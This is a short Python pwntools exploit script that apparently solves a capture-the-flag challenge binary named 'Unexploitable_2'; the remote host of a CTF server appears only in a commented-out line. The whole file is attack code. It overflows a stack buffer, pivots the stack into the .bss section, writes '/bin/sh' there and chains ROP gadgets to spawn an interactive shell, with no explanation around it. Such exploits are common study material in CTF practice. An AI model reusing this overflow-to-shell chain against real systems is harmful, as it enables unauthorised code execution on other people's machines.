from pwn import *
#r=remote("ctf.j0n9hyun.xyz", 3029)
r=process("./Unexploitable_2")
b=ELF("./Unexploitable_2")
context.log_level='debug'
main_read=0x00000000004006ee
bss=0x601950

pay=b'1'*0x10
pay+=p64(bss+0x10)
pay+=p64(main_read)
pause()
r.sendline(pay)

pay2=b'/bin/sh\x00'
pay2+=p64(0)
pay2+=p64(bss-0x50)
pay2+=p64(main_read)
r.sendline(pay2)
#bss+0x20
#bss='/bin/sh'
pay3=p64(0)
pay3+=p64(0)
pay3+=p64(0)
pay3+=p64(0x0000000000400773)
pay3+=p64(bss)
pay3+=p64(0x000000000040067f)

r.sendline(pay3)
r.interactive()
